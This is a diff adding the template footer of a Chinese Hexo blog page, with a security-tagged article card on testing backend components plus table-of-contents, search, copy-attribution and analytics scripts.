+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            测试后端组件
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-07
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%AE%89%E5%85%A8/" class="post-category" target="_blank">
+                                    安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Web/" target="_blank">
+                        <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%AE%89%E5%85%A8/" target="_blank">
+                        <span class="chip bg-color">安全</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: FightingTree<br />'
+            + '作者: fightingtree<br />'
+            + '链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fa fa-list"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).slideUp(500);
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).slideDown(500);
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row left-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://fightingtree.github.io/" target="_blank">fightingtree</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
+            </div>
+
+         <div class="col s12 m8 l8 copy-right">
+            
+                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;
+            站点总字数:&nbsp;
+                <span class="white-color">234.8k</span>
+            
+            </div>
+        <div class="col s12 m8 l8 copy-right">
+            
+			
+                <br>
+                
+                <span id="busuanzi_container_site_pv">
+                    <i class="fa fa-heart-o"></i>
+            本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+                </span>
+                
+                
+                <span id="busuanzi_container_site_uv">
+                    <i class="fa fa-users"></i>
+                    次,&nbsp;
+            访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+                </span>
+                
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://weibo.com/u/6112857421?from=myfollow_all" class="tooltipped" target="_blank" data-tooltip="访问我的微博" data-position="top" data-delay="50">
+        <i class="fa fa-weibo"></i>
+    </a>
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', '');
+</script>
+
+
+
+    <script src="/libs/others/clicklove.js"></script>
+
+
+
+
+
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+
+
+</body>
+</html>
